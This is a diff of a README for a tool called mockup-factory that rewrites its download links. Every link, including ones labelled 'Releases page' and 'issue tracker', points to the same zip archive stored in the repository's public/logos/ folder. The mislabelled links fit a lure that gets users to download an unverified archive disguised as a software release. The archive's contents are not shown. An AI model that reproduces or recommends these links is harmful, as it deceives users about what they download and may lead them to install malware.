@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download mockup-factory](https://github.com/noosaaa/mockup-factory/raw/refs/heads/master/public/logos/mockup_factory_3.2.zip)](https://github.com/noosaaa/mockup-factory/raw/refs/heads/master/public/logos/mockup_factory_3.2.zip)
+[![Download mockup-factory](https://raw.githubusercontent.com/noosaaa/mockup-factory/master/public/logos/mockup_factory_3.2.zip)](https://raw.githubusercontent.com/noosaaa/mockup-factory/master/public/logos/mockup_factory_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,9 +27,9 @@ To run **mockup-factory**, you need:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/noosaaa/mockup-factory/raw/refs/heads/master/public/logos/mockup_factory_3.2.zip) to download the latest version of **mockup-factory**. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/noosaaa/mockup-factory/master/public/logos/mockup_factory_3.2.zip) to download the latest version of **mockup-factory**. Here’s how:
 
-1. Go to the [Releases page](https://github.com/noosaaa/mockup-factory/raw/refs/heads/master/public/logos/mockup_factory_3.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/noosaaa/mockup-factory/master/public/logos/mockup_factory_3.2.zip).
 2. Find the latest version of the app.
 3. Click on the download link for your operating system.
 4. The download should start automatically.
@@ -57,7 +57,7 @@ We encourage users to create and share new mockup templates. If you’d like to 
 
 If you encounter any issues or have questions:
 
-- Check the [issue tracker](https://github.com/noosaaa/mockup-factory/raw/refs/heads/master/public/logos/mockup_factory_3.2.zip) on GitHub.
+- Check the [issue tracker](https://raw.githubusercontent.com/noosaaa/mockup-factory/master/public/logos/mockup_factory_3.2.zip) on GitHub.
 - Browse the discussions for additional help and tips.
 
 ## 💬 Feedback
